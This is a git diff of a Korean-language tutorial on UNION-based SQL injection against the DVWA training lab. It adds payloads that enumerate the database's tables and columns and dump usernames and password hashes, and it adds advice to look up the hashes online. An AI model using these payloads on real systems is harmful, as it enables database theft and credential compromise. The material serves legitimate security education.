@@ -142,7 +142,9 @@ UNION을 이용한다면 DB의 모든 정보를 알아낼 수 있다. UNION을 �
 
 
 #### dvwa 데이터베이스의 테이블 명 조회
-~~~sql 1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #~~~
+~~~sql 
+1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
+~~~
  
  guestbook, users 라는 테이블이 있는 것을 확인할 수 있다. 개인정보가 있는것처럼 보이는 users 테이블을 살펴보도록 한다.
  
@@ -151,7 +153,9 @@ UNION을 이용한다면 DB의 모든 정보를 알아낼 수 있다. UNION을 �
 
 
 #### users 테이블 칼럼 조회
-~~~sql 1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'#~~~ 
+~~~sql 
+1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'#
+~~~ 
 
 user_id, first name, surname, passwd 를 보여준다.
 
@@ -159,19 +163,24 @@ user_id, first name, surname, passwd 를 보여준다.
 
 
 
-이제, users 테이블에서 사용자이름과 password 만 출력해보자
+이제, users 테이블에서 사용자이름과 password 만 출력해보자!
 
 ~~~sql 
-
+1' union select user,password from users#
 ~~~
 
+아래와 같이 사용자명과 password가 surname에 해쉬값의 형태로 출력되었다.
 
 
+
+
+구글탭에 해쉬값을 넣어 password를 알아보면 어떤 문자열인지 알 수 있다. 
 
 
 
 <br><br>
 
-### (2) MEDIUM 단계
+### (2) 블라인드 SQL 인젝션
+
 
 
